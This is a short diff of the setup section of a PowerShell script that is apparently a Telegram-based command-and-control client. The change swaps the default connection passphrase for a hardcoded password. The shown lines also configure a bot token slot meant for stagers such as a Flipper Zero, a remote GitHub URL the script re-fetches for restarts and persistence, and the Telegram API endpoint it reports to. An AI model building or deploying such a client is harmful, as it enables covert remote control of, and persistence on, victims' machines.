@@ -12,7 +12,7 @@ SEE README FOR MORE INFO
 # ---------------------------------------------- SCRIPT SETUP -----------------------------------------------
 # Define Connection Variables
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
-$PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
+$PassPhrase = "Xm3f8xgzwe@" # 'password' for this connection (computername by default)
 $global:errormsg = 1 # 1 = return error messages to chat (off by default)
 $parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
